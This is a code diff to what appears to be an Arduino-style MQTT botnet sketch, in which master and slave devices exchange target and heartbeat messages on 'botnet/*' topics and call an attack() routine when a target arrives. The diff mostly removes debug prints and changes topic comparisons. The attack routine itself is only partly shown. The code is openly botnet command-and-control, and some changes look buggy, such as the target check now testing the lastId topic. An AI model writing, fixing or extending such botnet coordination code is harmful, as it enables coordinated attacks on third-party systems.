@@ -47,22 +47,15 @@ void on_messagem(char* topic, byte* payload, unsigned int length){
   for (int i=0;i<length;i++) {
   char receivedChar = (char)payload[i];
   
-  Serial.print("tttt");
-    Serial.print(topic);
-    Serial.println("ttttttt");
-    Serial.println(receivedChar);
-    Serial.println(lastId);
   Serial.print(topic+' '+receivedChar);
   char* var="botnet/lastId";
-  Serial.print("t");
-  Serial.println(topic==var);
-  Serial.print("i");
+
   Serial.println(lastId!=String(receivedChar).toInt());
 
   
   if(String(topic)==String(var) and lastId!=String(receivedChar).toInt())
   {
-    Serial.println("entro");
+
     lastId=receivedChar;
 
 
@@ -71,7 +64,7 @@ void on_messagem(char* topic, byte* payload, unsigned int length){
     
    
   }
-  if(topic=="botnet/target")
+  if(String(topic)==String(var))
   {
     target=receivedChar;
     Serial.println("New local target: ");
@@ -88,15 +81,15 @@ void on_messagesc(char* topic, byte* payload, unsigned int length){
    for (int i=0;i<length;i++) {
   char receivedChar = (char)payload[i];
   Serial.print(topic+' '+receivedChar);
-  
-  if(topic=="botnet/heartbeat" && lastId!=receivedChar)
+  char* var="botnet/heartbeat";
+  if(String(topic)==String(var) and lastId!=String(receivedChar).toInt())
   {
     lastId=receivedChar;
     char * hola=" ";
     sprintf(hola,"New local last id: %i",lastId);
     Serial.print(hola);
   }
-  if(topic=="botnet/heartbeat" && lastId!=0)
+  if(String(topic)==String(var) && lastId!=0)
   {
     target=receivedChar;
     attack();
@@ -125,7 +118,7 @@ void attack()
     client.loop();
     if(((millis()-time1)/tiempo2)==0)
     {
-      Serial.print("Checking");
+      Serial.println("Attacking");
       if(target==0)
       {
         break;
@@ -169,6 +162,7 @@ void slave()
   }
 void master()
 {
+  Serial.println("I'm master");
   const char * clienteId;
  // client.connect(on_connectm);
  //-----------------------------------
@@ -210,7 +204,7 @@ void master()
           //Serial.println(atoi((const char*)lastId));
           
           sprintf(hola,"%i %i",(int)target,(int)lastId);
-          Serial.print("popo: ");
+          Serial.print("Target y Last id: ");
          Serial.println(hola);
           client.publish("botnet/heartbeat",hola);
     
@@ -226,6 +220,7 @@ void master()
   }
 void common()
 {
+  Serial.println("I'm common");
     char * clienteId;
 //    client.connect(on_connectsc);
  client.setCallback(on_messagesc);
@@ -323,7 +318,7 @@ void reconnect() {
 void setup()
 {
  Serial.begin(115200);
- Serial.println("esta en el setup");
+
 // status = WiFi.begin(ssid, password);
 // if ( status != WL_CONNECTED) { 
 //    Serial.println("Couldn't get a wifi connection");
@@ -341,7 +336,7 @@ void setup()
  
 void loop()
 {
- Serial.println("loop"); 
+ 
  if (!client.connected()) {
   Serial.println("conectando");
   common();
